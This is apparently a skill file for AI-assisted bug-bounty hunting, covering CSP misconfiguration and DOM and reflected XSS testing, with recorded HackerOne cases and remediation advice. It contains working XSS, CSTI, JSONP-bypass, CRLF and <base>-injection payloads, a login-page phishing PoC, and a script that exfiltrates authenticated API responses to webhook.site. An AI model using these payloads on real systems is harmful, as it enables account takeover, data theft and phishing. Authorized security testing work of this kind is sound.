---
name: csp-misconfig-xss-testing
description: Finding DOM-based XSS via unsafe reflected URL parameters, and checking whether a target's Content-Security-Policy header actually blocks the resulting script execution or is misconfigured (e.g. 'unsafe-inline') to let it through anyway. Use this during Phase 3 (Vulnerability Testing — Client-side) of bughunting-workflow whenever inspecting response headers for CSP directives, testing a search/reflection parameter for XSS, or the target sends a Content-Security-Policy header at all. Also trigger on mentions of CSP, unsafe-inline, script-src, DOM XSS, or innerHTML sinks.
---

# CSP Misconfiguration → XSS Testing

General technique library for CSP-bypass-enabled XSS. Add new dated entries below as more writeups are processed.

## Core theory

CSP is meant to be a defense-in-depth backstop against XSS — even if an app has a reflected-XSS bug, a correctly configured CSP should stop the injected script from executing. `'unsafe-inline'` in `script-src` disables exactly that protection, so any XSS sink that exists on the page becomes fully exploitable again, as if there were no CSP at all. In other words: CSP misconfiguration doesn't create the XSS — it fails to stop one that's already there. You still need to find the underlying DOM sink; the CSP check just tells you whether the platform's safety net actually catches it.

## Recon: checking CSP quickly

1. Pull response headers for the target: `curl -I https://target.example.com/`.
2. Look specifically at the `Content-Security-Policy` header's `script-src` (and `default-src` as fallback) directive.
3. Red flags that mean injected scripts will likely execute if a DOM sink exists:
   - `'unsafe-inline'` present in `script-src` — allows inline `<script>` blocks and inline event handlers to run.
   - No CSP header at all.
   - `script-src` allowlists a broad/wildcard external host, or one that itself hosts user-uploadable content (e.g. a CDN with open write access) — lets an attacker load an external payload script even without `unsafe-inline`.
   - Missing `strict-dynamic` combined with a nonce/hash approach that's implemented loosely.
4. This is a cheap, fast check to run across every host discovered in Phase 1/2 recon — worth automating (e.g. scripted `curl -I` across a subdomain list) rather than checking one target at a time, since a misconfigured CSP on its own is a low-severity finding until paired with a sink.

## Finding the DOM sink

Manually browse the app's UI (search boxes, filters, any feature that reflects a URL parameter back into the page) while watching how input reaches the DOM. Classic vulnerable pattern:
```javascript
var searchVal = location.href.split('q=')[1];
document.getElementById('result').innerHTML = searchVal;
```
Any use of `innerHTML` (or `document.write`, `eval`, `setAttribute` on event-handler attributes) fed by `location.href`/`location.search`/`document.URL` without encoding is a DOM XSS sink. Confirm with a simple PoC:
```
/search?q=<img src=x onerror=alert(1)>
```

**Key distinction from reflected/server-side XSS worth remembering while hunting:** DOM XSS's payload is *never visible in the HTTP response body* at all — the server sends back the same generic HTML/JS every time, and the vulnerable behavior only happens client-side, in the browser, after the page's own JS reads the source and writes it into a sink. This means you can't detect it by diffing response bodies the way you would reflected XSS — you have to trace data flow inside the JS itself (source code reading, or runtime breakpoints), not response inspection.

### Full source/sink taxonomy — sweep every combination, not just `location.search`→`innerHTML`

**Sources (where attacker-controlled data enters the page):**
- `location.hash`, `location.search`, `location.href` — the classic URL-based sources, all directly attacker-controllable via a crafted link.
- `document.referrer` — controllable by whichever page links to the target; test by hosting a link with a payload-shaped path/query on the referring page.
- `window.name` — persists across navigations within the same tab; an attacker can set it on a page they control, then navigate the victim to the target, carrying the value along.
- `postMessage` — cross-window messages; see `postmessage-xss-testing` for the full listener-discovery/origin-validation-bypass methodology on this source specifically, since it's involved and dangerous enough to warrant its own dedicated skill rather than being just one row in this list.

**Sinks (where that data gets executed/rendered unsafely):**
- `innerHTML`, `outerHTML`, `insertAdjacentHTML` — parse and render raw HTML, the highest-frequency sink.
- `eval()`, `Function()`, `new Function(...)`, `setTimeout(str, ...)`/`setInterval(str, ...)` when passed a **string** argument (not a function reference) — all execute arbitrary code from a string.
- `document.write()`/`document.writeln()`.
- The `location`/`window.location`/`location.href` **sink** (distinct from `location.*` as a *source* above) — assigning attacker-influenced data to `location` lets a `javascript:` URI execute:
  ```
  javascript:alert(1)
  ```
  Note CSP can block this specific vector even when the underlying sink is unsafe — check the target's CSP `script-src` for whether it actually stops `javascript:` URI execution before assuming this sink is exploitable (ties back to this skill's core CSP-gating premise).
- **jQuery-specific sinks:** `.html()`, `.append()`/`.prepend()`, and selector-based injection (`$(userInput)` where `userInput` can contain a crafted selector/HTML string) — jQuery's own convenience methods reproduce the same `innerHTML`-style risk under a different API surface, worth checking explicitly on any jQuery-based frontend.
- **Framework template-expression sinks (Client-Side Template Injection / CSTI):** AngularJS (and similarly-designed template engines) evaluate `{{ }}`-delimited expressions in the DOM — if attacker input reaches a template context unsanitized, the *expression syntax itself* becomes the injection point, not an HTML tag:
  ```javascript
  {{constructor.constructor('alert(1)')()}}
  ```
  This works even in contexts where HTML-tag injection is otherwise blocked, since it's not injecting a tag at all — it's abusing the template engine's own expression evaluator. Test this specifically on any AngularJS/Vue-templated page where a plain `<script>`/`<img onerror>` payload fails, before concluding the input is safe.

### Two discovery methodologies — use both, they catch different bugs

**1. Static source-to-sink tracing:** read the (often minified/obfuscated) JS looking for any of the sources above, then manually trace that variable forward through the code to see whether it ever reaches one of the sinks above without sanitization in between. Slow but works on code you can't easily instrument live, and catches sinks that only fire under conditions hard to trigger by clicking around.

**2. DOM runtime interception:** open DevTools → **Sources** panel → set a breakpoint on the specific sink (right-click the element/use "Break on attribute modification," or use the browser's built-in `DOMBreakpoints`), then trigger the feature and watch the call stack pause exactly when the sink fires, showing you the live value and its call chain back to the source. Faster than static tracing once you already suspect *which* sink is involved, and catches dynamically-constructed sinks that don't show up cleanly in static source review.

**Automated tooling for both:** **Burp DOM Invader** (flags source→sink flows automatically while browsing through Burp's proxy, including framework-specific CSTI sinks) and **Untrusted Types** (taint-tracks data flow from source to sink in real time) — both already referenced in `postmessage-xss-testing`'s discovery-tooling section for the `postMessage`-source case specifically; they cover the full source list here, not just that one source.

**Base64/encoded-data gotcha:** don't assume a source is safe just because the value passed through `atob()`/a decoder before reaching a sink — trace *through* any decode/transform step rather than stopping at "it's decoded, so it's probably sanitized," since decoding is a data transformation, not a sanitization step.

## Reflection discovery and context-specific payload construction

Before assuming a reflection point is a dead end because a naive `<script>` tag got encoded, work through this three-step methodology — most "not vulnerable" first impressions are actually a context mismatch, not an unbreakable filter:

**Step 1 — map every reflection point.** Insert a unique, greppable marker string (e.g. `intigriti1337test`) into every URL parameter, form field, and header the app accepts, then search the raw HTTP response for that exact string. This tells you *where* input comes back before you worry about *how* to break out of it — cross-reference `hidden-parameter-discovery-testing` for the full Arjun/x8/Param Miner methodology to find reflection points that aren't in the obvious/visible form fields.

**Step 2 — confirm encoding status with a harmless tag.** Inject a simple, low-risk tag (`<s>intigriti1337test`) at each reflection point. If it comes back HTML-entity-encoded (`&lt;s&gt;`), that specific point is doing its job — move on. If it comes back verbatim/unencoded, that's your candidate.

**Step 3 — construct a context-specific payload.** The *same* unencoded reflection needs a completely different payload shape depending on exactly where in the page it lands — always identify the surrounding context before picking a payload, rather than reusing one generic string everywhere:

- **Generic HTML context** (reflected between existing tags, no attribute/script wrapper) — no breakout needed, inject a tag directly:
  ```html
  <script>alert(1)</script>
  <img src=x onerror=alert(1)>
  ```
- **HTML attribute context** (reflected inside `value="..."`, `href="..."`, etc.) — close the attribute's quote, close the tag, then inject a fresh element or event handler. Match the quote character the app actually used (single vs. double) or the breakout won't parse:
  ```html
  "><script>alert(1)</script>
  " onload=alert(1) x="
  ```
- **JavaScript block context** (reflected inside an existing `<script>` block, e.g. `var data = "REFLECTION";`) — close the string literal, inject a statement, then comment out whatever syntax follows so the rest of the original script doesn't throw and abort execution:
  ```javascript
  "; alert(document.domain); //
  ```
  If the surrounding code uses a template literal (`` `...${REFLECTION}...` ``) instead of a plain string, you don't even need to break out of the string at all — `${}` substitution syntax executes directly inside the backticks:
  ```javascript
  ${alert(document.domain)}
  ```
  Syntactic validity matters here more than in the HTML contexts above — an unclosed bracket/quote after your payload throws a JS error that can silently prevent your own injected code from running, so always account for what comes after the reflection point, not just what precedes it.
- **`<textarea>` context** — browsers render literal text inside a `<textarea>` rather than parsing it as HTML, so a plain `<script>` injected there never executes; close the textarea tag first, *then* inject:
  ```html
  </textarea><script>alert(1)</script>
  ```

**When tags/attributes are filtered (blacklist-style filtering, not full encoding):** don't stop at your first blocked attempt — systematically fuzz which specific tags and event-handler attributes the filter actually lets through, rather than guessing one at a time. **PortSwigger's XSS cheat sheet** (`portswigger.net/web-security/cross-site-scripting/cheat-sheet`) is the standard reference for this — a large enumerated list of HTML tags/attributes/event handlers to sweep through and find whichever specific combination the filter didn't anticipate.

**Self-XSS caveat:** a payload that only fires when the *victim themselves* pastes/submits it into their own session (rather than firing from a link/request an attacker sends) is not independently exploitable and is routinely rejected — it only becomes reportable when chained with something that forces the action without the victim's awareness (CSRF-forcing the vulnerable submission, clickjacking).

## Escalating: from PoC alert to real session hijack

Once the sink fires, don't stop at `alert(1)` in the report — escalate to something that demonstrates real impact:

1. **Load an external payload script** instead of an inline PoC, since it's easier to iterate on and keeps the URL payload short:
   ```
   /search?q=<script src=https://<attacker-host>/x.js></script>
   ```
2. **In the hosted script, exfiltrate live session data** by making an authenticated request (browser sends cookies automatically since the script runs same-origin) and shipping the response to an out-of-band collector:
   ```javascript
   fetch('https://target.example.com/api/user', { credentials: 'include' })
     .then(r => r.text())
     .then(d => fetch('https://webhook.site/<your-id>', { method: 'POST', body: d }));
   ```
   Use `webhook.site` or a Burp Collaborator-style domain to catch the exfiltrated data — this is the same "prove it, don't just pop an alert" pattern as CSWSH exploitation in `websocket-security-testing`.
3. Frame the attack chain in the report as: victim visits a crafted link → inline/loaded script executes (because CSP allowed it) → authenticated API call runs in the victim's session → response silently exfiltrated. That chain (not the bare XSS) is what justifies a high severity rating — actual impact was PII (email, name, phone), internal API tokens, and potential access to admin-privileged endpoints in the source writeup.

## Impact framing for report

Don't report "CSP allows unsafe-inline" alone — that's informational/low severity by itself. Pair it with the DOM sink and a concrete exfiltration PoC to justify a meaningful severity rating; the CSP misconfig is what removes the safety net, but the sink + session-hijack chain is the actual finding.

## Remediation notes (for reports / retesting a fix)

- Remove `'unsafe-inline'` from `script-src`.
- Prefer nonce-based or hash-based allowlisting for legitimate inline scripts: `script-src 'self' 'strict-dynamic' 'nonce-<random-per-request>'`.
- At the code level: replace `innerHTML` with `textContent` (or a sanitization library) wherever user-controlled input reaches the DOM.
- Don't rely on client-side `localStorage` for session data — session/token handling should stay server-side (cookies with `HttpOnly`/`Secure`/`SameSite`), so even a successful script injection can't read it directly.
- Use Subresource Integrity (SRI) on any externally-loaded scripts that remain allowlisted.
- When retesting a "fixed" CSP, don't just check the header changed — re-verify the actual DOM sink is also fixed (encoded output) independently, since a program might tighten the CSP without fixing the underlying sink, or vice versa.

## Chaining

Apply during **Phase 3 (Vulnerability Testing)** of `bughunting-workflow`, under Client-side (this is a DOM-XSS variant, gated by whether CSP would otherwise block it). Worth a quick pass during Phase 1/2 recon too — checking CSP headers across all discovered hosts is cheap and flags high-value targets for deeper DOM-sink hunting later.

## Recorded technique: SSO/login-page HTML injection via UI-customization URL parameters — CSP-irrelevant variant
Source: HackerOne report [#3781785 — Reflected HTML Injection in Login Page via infotext/signintext Parameters](https://hackerone.com/reports/3781785), program: Essity, reporter: firecompass-ai, disclosed 2026-07-22. Severity: **High (7–8.9)**, Weakness: Improper Input Validation, no CVE, no bounty paid on this report.

**Where:** Microsoft AD FS (Active Directory Federation Services) federated sign-in endpoint (`/adfs/ls?wa=wsignin1.0&wtrealm=...`). Many organizations customize their AD FS login page's branding/messaging via a theme JS bundle that reads specific query-string parameters — here `infotext` and `signintext` — and writes them straight into the page via `innerHTML`, unencoded. Same DOM-sink shape as this skill's core theory (`location.search` value → `innerHTML`), just discovered on an identity-provider login page instead of an app search box.

**Root cause, and why this is a different animal from the rest of this skill:** dynamically-inserted `<script>` tags via `innerHTML` don't execute in any browser — so the realistic payload here isn't "pop an alert" or "exfiltrate a session token," it's **pure content injection**: plain tags (`<h2>`, `<p>`, `<a href>`) that render as real-looking page content with zero script execution required. That matters because CSP's `script-src` directive (this skill's whole premise) only gates *script* execution and inline event handlers — it does nothing to stop non-script HTML tags from rendering via `innerHTML`. **A target can have a flawless CSP (`script-src 'none'`, no `unsafe-inline` anywhere) and still be fully exploitable by this technique**, because no script is involved at any point.

**Exploit steps:**
1. Find the target's AD FS federated sign-in endpoint — discoverable via any app offering "Sign in with your company account" that federates to AD FS, or by noting a `wtrealm=` value referencing a known relying-party app.
2. Append `signintext=<marker>` and `infotext=<url-encoded HTML>` to the sign-in request. Exact PoC from the report:
   ```
   https://<target>/adfs/ls?wa=wsignin1.0&wtrealm=https%3A%2F%2Fwww.<relying-party>.com%2Fconnect&whr=AD%20AUTHORITY&portalui=<theme>&signintext=SIGNIN_MIN_93470&infotext=%3Ch2%20id%3Dphish93470%3ESecurity%20notice%3C%2Fh2%3E%3Cp%3EContinue%20to%20verify.%3C%2Fp%3E%3Ca%20id%3Dlink93470%20href%3Dhttps%3A%2F%2Fexample.com%2F%3EContinue%3C%2Fa%3E
   ```
   Decoded `infotext`: `<h2 id=phish93470>Security notice</h2><p>Continue to verify.</p><a id=link93470 href=https://example.com/>Continue</a>`
3. Confirm: the `signintext` marker renders in the login-message area, and a fake "Security notice" block with a clickable "Continue" link appears directly on the real authentication page — served from the organization's own trusted IdP domain, not a lookalike.
4. Confirm the injected link is fully attacker-controlled (hover/click navigates off the legitimate page to whatever domain was injected) before reporting.
5. Escalate the *framing*: `wtrealm=` can reference any relying party the AD FS instance federates for, so one crafted link phishes the users of a specific downstream application while abusing the organization's real, trusted login domain to defeat normal "check the URL" phishing suspicion — call this out explicitly rather than reporting "HTML injection" alone.

**Impact framing for report:** the reporter's program initially had a specific relying-party subdomain marked out-of-scope, and preemptively argued that the *vulnerable host* (the shared AD FS login page) was in scope even though the *abused brand* wasn't — worth reusing that argument whenever a program's scope excludes a relying-party app but the shared IdP/login infra that can be made to phish that app's users is itself in scope. This report rated High (7-8.9) via CVSS but drew no bounty — a useful calibration data point that a script-free HTML-injection/phishing finding on an auth page is a real High-severity bug, but isn't guaranteed to pay like a session-hijacking DOM XSS would.

**Generalize note:** when auditing any `innerHTML`-fed reflected parameter, test the plain-content-tag payload (no `<script>`, no event handler) *before and independently of* whatever CSP is in place — this skill's other techniques all assume the attacker needs script execution and CSP is the gate; this one needs no script at all, so CSP strength is irrelevant to it. Generalizes beyond AD FS to any auth/SSO/IdP provider that exposes login-page branding/text customization via URL parameters or unauthenticated config — treat every such "customize the login page" parameter as a DOM-sink candidate, and remember the blast radius on an IdP is every relying party it federates for, not just the IdP's own users.

## Recorded technique: classic server-side reflected XSS in a legacy CGI script — CSP-irrelevant, not a DOM sink
Source: HackerOne report [#3830771 — Reflected XSS in legacy CGI script `/cgi-bin/<script>.pl`](https://hackerone.com/reports/3830771), program: Essity, reporter: marioniangi, disclosed 2026-06-30. Severity: **High (7–8.9)**, Weakness: Reflected XSS, no CVE, no bounty. Note: HackerOne heavily redacted this disclosure (exact parameter/script names and the affected hostname are blacked out) — recorded here for the two genuinely reusable, non-redacted parts, not as a full exploit-chain writeup.

**Where it differs from the rest of this skill:** both other entries here are **DOM sinks** — client-side JS reading a URL parameter and writing it via `innerHTML`. This one is a **server-side** reflected XSS — a legacy Perl CGI script concatenated a query-string parameter directly into the HTML it generated, with zero output encoding, server-side. CSP's `script-src` is irrelevant to *both* categories for the same underlying reason this skill's first "CSP-irrelevant variant" entry already established (no `unsafe-inline` gate applies to `innerHTML`-inserted plain tags) — but here it's simpler still: there's no client-side sink at all to gate, the browser is just rendering exactly what the server sent, unescaped, same as any framework-less server-rendered page from the pre-auto-escaping era.

**Recon signal — hunt legacy `/cgi-bin/*.pl`, `*.cgi` scripts specifically:** the reporter found this "during regular bug hunting activities... performing reconnaissance on Essity's public infrastructure, identified legacy CGI scripts that were still accessible." Generalize this as a standing recon check: legacy CGI scripts (`.pl`, `.cgi`, and by extension any pre-modern-framework backend extension like old unmaintained `.asp`) predate template-engine auto-escaping entirely — when one turns up in dir-bruteforce/wayback results, assume raw string concatenation into the response until proven otherwise, and test every reflected parameter with a bare `<script>alert(document.domain)</script>` first before reaching for any filter-evasion payload; on scripts this old, the filter usually just isn't there. Cross-reference `recon-scanning-toolkit`'s directory/file bruteforcing and Wayback Machine CDX-API sections for finding forgotten legacy paths like this one in the first place.

**Reproduction-hygiene gotcha worth reusing in your own reports:** the triager's first response was "we are unable to access/see any XSS" — not because the bug wasn't real, but because the legacy host's TLS cert didn't match its hostname, so Chrome's `NET::ERR_CERT_COMMON_NAME_INVALID` interstitial blocked the page (and the payload) from ever loading over HTTPS. The reporter's fix was simple: **give the plain-HTTP URL as the primary PoC** whenever a legacy/internal host has a broken cert — it skips the interstitial entirely and the payload fires immediately, avoiding a round-trip of "needs more info" triage friction. When submitting a PoC against any old/internal-looking host, proactively check for a cert mismatch and provide the HTTP-equivalent URL (plus a screen recording) alongside the HTTPS one rather than waiting for a triager to hit the same wall.

**Impact framing for report:** kept scope narrow and honest — unauthenticated reflected XSS enabling session hijacking and credential phishing under the real Essity origin (trusted-domain phishing, same value proposition as any reflected XSS on a first-party domain), plus a secondary info-disclosure note that the script's own generator/author metadata leaked an internal hostname in page source. Rated High (7-8.9) on the XSS alone, no bounty paid — another data point (alongside the CSP-irrelevant AD FS entry above) that unauthenticated reflected/HTML-injection XSS on this particular program rates High but doesn't reliably pay a bounty.

## Recorded technique: reflected XSS gated behind a business-logic error path, in a legacy network-utility CGI
Source: HackerOne report [#3793533 — Unauthenticated reflected XSS in Essity "Network Toolbox" CGI](https://hackerone.com/reports/3793533), program: Essity, reporter: larocas, disclosed 2026-06-23. Severity: escalated from Medium to **High (7–8.9)** by Essity's own internal assessment (not reporter pushback). Weakness: Reflected XSS, no CVE, no bounty.

**Same underlying class as the `#3830771` legacy-CGI entry above** (server-side reflected XSS, zero output encoding, CSP irrelevant since there's no client-side sink at all) — recorded separately because of three details worth generalizing beyond that entry:

**Where:** a legacy Perl "Network Toolbox" CGI — a ping/traceroute-style internal network utility exposed externally — reflecting a `packet_size` parameter into an `<h3>` error element.

**The reflection was gated behind business logic, not always-on:** the payload only reflected when two conditions held together — `action=Run_Cmd` *and* `packet_size` being non-integer. A normal/valid `packet_size` value presumably gets used in an actual ping command and never echoed back raw; only the *validation-failure* path echoes the raw input into the error message. **Generalize:** when testing a parameter that looks numeric/typed (packet size, count, timeout, port), don't stop at confirming it's used correctly — deliberately send an invalid/wrong-type value specifically to trigger the error-handling path, since error/validation-failure code is disproportionately likely to skip the encoding the "happy path" bothered to apply. Exact PoC:
```
target.cgi?action=Run_Cmd&ip=1.1.1.1&packet_size=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E&cmd=+Ping+
```

**Severity-escalation data point:** unlike the AD FS and other CGI entries in this skill (where severity was High from the start, or set via CVSS by the reporter), here the program itself raised Medium → High post-triage "due to internal assessment" — a useful signal that Essity's AppSec team applies judgment beyond a mechanical CVSS score, worth knowing when calibrating how conservatively/aggressively to self-rate a similar finding in a report to this program.

**Bundling a non-qualifying info leak into the same report:** the same page's HTML source separately leaked internal infrastructure details (internal hostname, management IP, an SNMP read-only community string, a server filesystem path, an internal contact) — called out explicitly in the report as "non-qualifying alone, worth remediating with the XSS." **Generalize:** when you find a qualifying vuln on a page, do a quick pass of the rest of that page's source/response for anything else leaking (comments, debug output, internal references) and mention it as a secondary note in the same report even if it wouldn't stand alone — costs nothing, and gives the program a more complete remediation picture in one pass rather than a follow-up report for something you already had in front of you.

**Remediation approach — full takedown rather than patch:** the program's fix here was to take the entire legacy CGI offline (subsequent requests return a plain Apache 404) rather than patch the encoding in place, consistent with the "these are ancient, forgotten, exposed-by-accident tools" framing that recurs across this program's legacy-CGI findings — when a target is this old and narrow-purpose, don't be surprised if the "fix" is deletion rather than a code change; verify retest by confirming the *specific vulnerable behavior* is gone (here, both "does the endpoint exist" and "does the payload still reflect" needed checking, since a 404 alone would already answer both).

## Recorded technique: five-category CSP bypass sweep — Report-Only trap, allowlisted-CDN/JSONP bypass, predictable nonces, and CSP injection
Source: [Content Security Policy (CSP) Bypasses](https://www.intigriti.com/researchers/blog/hacking-tools/content-security-policy-csp-bypasses)

Extends this skill's existing "check for `unsafe-inline`/wildcard/no-CSP" recon pass into a fuller taxonomy — run all five checks below, not just the `unsafe-inline` one already covered above, before concluding a CSP is actually protective.

**Where:** any target sending a CSP header/meta tag at all — test every route separately, since the article stresses CSP commonly varies across different endpoints of the same app (a hardened policy on the main app doesn't mean the login page, an admin subpanel, or a legacy route inherits it).

**Root cause (per category):**
1. **No CSP declared at all** — check both the `Content-Security-Policy` response header *and* an HTML `<meta http-equiv="Content-Security-Policy">` tag; a header-based check alone can miss a meta-tag-only policy or vice versa.
2. **`Content-Security-Policy-Report-Only`** — this header mode only *reports* violations to a `report-uri`/`report-to` endpoint, it never blocks anything. A page sending only the Report-Only variant (no enforcing `Content-Security-Policy` header alongside it) has zero actual script-blocking in the browser regardless of how strict the reported policy looks on paper — grep specifically for the `-Report-Only` suffix, don't assume any CSP-shaped header is enforcing.
3. **Allowlisted CDN hosting a vulnerable library version** — `script-src 'self' https://cdnjs.cloudflare.com https://ajax.googleapis.com` looks reasonable (real, reputable CDNs), but if either CDN happens to also host an old/vulnerable JS library version at a path the CSP's host-based allowlist doesn't distinguish, `<script src="https://cdnjs.cloudflare.com/ajax/libs/<vulnerable-lib>/<old-version>/<file>.js"></script>` loads and executes fully within the allowed policy — the CSP was never wrong about *which host* to trust, the bypass lives in *what that host serves*.
4. **JSONP endpoints on an allowlisted host** — a legacy JSONP endpoint (`callback=` param wrapping a JSON response in a function call) on any domain already present in `script-src` can be abused as an arbitrary-code-execution gadget: point `<script src="https://allowlisted-host.com/jsonp?callback=alert(document.domain)//">` at it, and the "callback" the endpoint blindly wraps its response in becomes attacker-controlled executable JS, loaded from a host the CSP explicitly trusts.
5. **Predictable nonces** — if a `'nonce-<value>'` is generated from something guessable (a timestamp, a fixed per-session value reused across requests, a value derivable from a visible `User-Agent`/other request echo) rather than a fresh cryptographically-random value per response, an attacker who can predict/observe the current nonce can craft a payload carrying that same nonce and have it treated as trusted. The source demonstrated a nonce rotating only every ~60 seconds and derivable from a timestamp — "considerable time" to observe the current value and fire a matching payload before rotation.
6. **CSP injection via dynamic policy generation** — when the CSP header itself is built server-side from request-influenced input without sanitization, CRLF/parameter injection can let an attacker inject their *own* directives into the response's CSP header (or blank it out), e.g. a request like `/?csp_report_uri=/report;%0Ascript-src%20*%20'unsafe-inline';&vulnerable=<script>alert()</script>` — older PHP versions in particular historically permitted raw CRLF through into headers this way. Cross-reference `crlf-injection-testing` for the general header-injection mechanics this specific case rides on.
7. **Mutation XSS (mXSS) via tag-nesting sanitizer bypass** — a sanitizer that validates the *input* HTML string can still be bypassed if the browser's own HTML parser later *mutates* that already-sanitized string into something dangerous when re-parsing it (e.g. when the sanitized output gets written via `innerHTML` and then re-read/re-parsed, as happens with some rich-text editors and `DOMPurify`-adjacent libraries under specific configs). A tag combination like `<math><style>` can look inert to the sanitizer at validation time but mutate into an executable form once the browser's actual parser processes it — this is a sanitizer-logic bug, not a CSP-directive weakness, so it bypasses even a strict CSP the same way `innerHTML`-inserted plain tags do (see the existing CSP-irrelevant-variant entries above). Worth a dedicated pass with known mXSS tag/payload sets (search "mutation XSS cheat sheet" for current browser-specific payloads) on any target with user-controlled rich-text/HTML input that goes through a sanitizer before storage/render.
8. **`<base>` tag injection** — if an attacker can inject *any* HTML at all (even where `<script>` itself is filtered), injecting `<base href="https://attacker.com/">` changes the base URL every subsequent *relative* `src`/`href` on the page resolves against, silently redirecting legitimate-looking relative script/resource loads to an attacker-controlled host. Effective even under a CSP that properly restricts `script-src`, since the attack doesn't execute a new script — it redirects where an already-trusted *relative* script reference loads from; only closed by also restricting `base-uri` in the CSP, a directive frequently forgotten alongside `script-src`.

**Exploit steps (the actual detection sweep, per target route):**
1. `curl -I` every route separately; note both `Content-Security-Policy` and `Content-Security-Policy-Report-Only` presence/absence, and check page source for a meta-tag equivalent too.
2. Run **Google's CSP Evaluator** against any policy found — it flags weak/overly-broad directives (wildcards, missing directives, unsafe keywords) automatically rather than eyeballing a long policy string by hand.
3. For any allowlisted CDN/external host in `script-src`, run **CSPBypass** (or manually browse the CDN's own hosted-library catalog) to check for a vulnerable-version match, and separately probe the same hosts for a live JSONP endpoint with a `callback=`-style parameter.
4. If a nonce is present, capture several consecutive nonce values across repeated requests/page loads and look for a discoverable pattern (timestamp correlation, reuse, short rotation window) before assuming it's properly random.
5. If any part of the CSP header appears to reflect request-influenced input (a param value, a report-URI you control), test CRLF/parameter-injection payloads targeting the CSP header specifically, not just the body.
6. Check whether `base-uri` is set alongside `script-src` — if absent, `<base href="...">` injection (category 8) works regardless of how strict `script-src` is elsewhere.
7. On any rich-text/HTML-sanitizing input feature, run a current mXSS payload set (category 7) specifically through the save→reload round-trip, not just an immediate render — mutation bugs often only surface on re-parse.

**Related upload-path note:** `file-upload-testing`'s SVG-script-injection vector (`<svg><script>` stored-XSS via SVG upload) is also a CSP-relevant bypass worth checking here specifically — an SVG served from an allowlisted same-origin path can carry inline script that executes under a CSP that would otherwise block `unsafe-inline`, since the script lives inside the SVG document's own context rather than the parent page's inline-script restriction. Cross-reference rather than duplicate that skill's upload mechanics.

**Impact framing for report:** per the source, quoted directly — **"Most programs won't accept CSP bypass reports as standalone vulnerabilities."** A CSP bypass alone (even a demonstrably weak policy) is informational; it becomes reportable only once chained with an actual injection point that the *weakened* CSP now fails to stop — an existing reflected/DOM XSS sink (this skill's core technique), a file-upload feature landing content on an allowlisted host, or a JSONP endpoint reachable on a trusted domain. Frame the report as the full chain (weak CSP directive → specific bypass technique → concrete script execution demonstrated), exactly like this skill's existing `unsafe-inline` guidance already establishes.

**Generalize note:** categories 3-4 (vulnerable-library/JSONP-on-allowlisted-host) generalize this skill's core "the CSP wasn't wrong about the domain, it was wrong to assume everything on that domain is safe" insight — any time a CSP allowlists a third-party host by domain rather than by exact path/subresource-integrity hash, treat *everything else that host serves* as a potential bypass surface, not just the specific script the app actually intends to load from there.

## Source

[From CSP to OMG: How a Tiny Misconfigured Header Let Me Run JS Anywhere](https://medium.com/bugbountywriteup/from-csp-to-omg-how-a-tiny-misconfigured-header-let-me-run-js-anywhere-054e30090230) — processed 2026-09-22 via freedium mirror (WebFetch succeeded directly).

[Content Security Policy (CSP) Bypasses](https://www.intigriti.com/researchers/blog/hacking-tools/content-security-policy-csp-bypasses) — not Medium/HackerOne (Intigriti's own researcher blog); WebFetch succeeded directly, processed 2026-09-24.

[Hunting for Reflected XSS Vulnerabilities](https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-reflected-xss-vulnerabilities) — not Medium/HackerOne (Intigriti's own researcher blog); WebFetch succeeded directly, processed 2026-09-24. Fed the "Reflection discovery and context-specific payload construction" section above.

[Exploiting DOM-based XSS Vulnerabilities](https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-dom-based-xss-vulnerabilities) — not Medium/HackerOne (Intigriti's own researcher blog); WebFetch succeeded directly, processed 2026-09-24. Fed the full source/sink taxonomy and two-methodology section under "Finding the DOM sink" above.

<!-- Add new recorded techniques below this line as new CSP/DOM-XSS writeups are processed. -->
